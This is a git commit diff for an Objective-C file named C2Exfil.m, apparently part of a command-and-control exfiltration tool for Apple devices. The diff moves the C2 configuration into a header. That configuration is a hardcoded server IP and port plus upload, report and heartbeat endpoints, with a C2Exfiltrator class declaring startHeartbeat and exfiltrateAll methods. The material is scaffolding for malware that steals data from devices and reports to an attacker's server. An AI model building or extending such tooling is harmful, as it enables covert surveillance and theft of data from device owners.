d80c4f8c91da95f9a33d18c1ead42f11856870d1
linxiang1208 <linxiang1208@gmail.com>
2026-09-15 05:13:24 +0800

    Fix C2Exfil.h header file

--- C2Exfil.m
+++ C2Exfil.m
@@ -1,18 +1,5 @@
 #import <Foundation/Foundation.h>
-
-// C2 Server Configuration - 修改为你的平台地址
-#define C2_HOST @"192.168.110.111"
-#define C2_PORT 8081
-#define C2_UPLOAD_PATH @"/api/v1/upload"
-#define C2_REPORT_PATH @"/api/v1/c2/report"
-#define C2_HEARTBEAT_PATH @"/api/v1/heartbeat/1"
-
-@interface C2Exfiltrator : NSObject
-+ (instancetype)shared;
-- (void)setDeviceId:(NSString *)deviceId;
-- (void)startHeartbeat;
-- (void)exfiltrateAll;
-@end
+#import "C2Exfil.h"
 
 @implementation C2Exfiltrator {
     NSString *_deviceId;
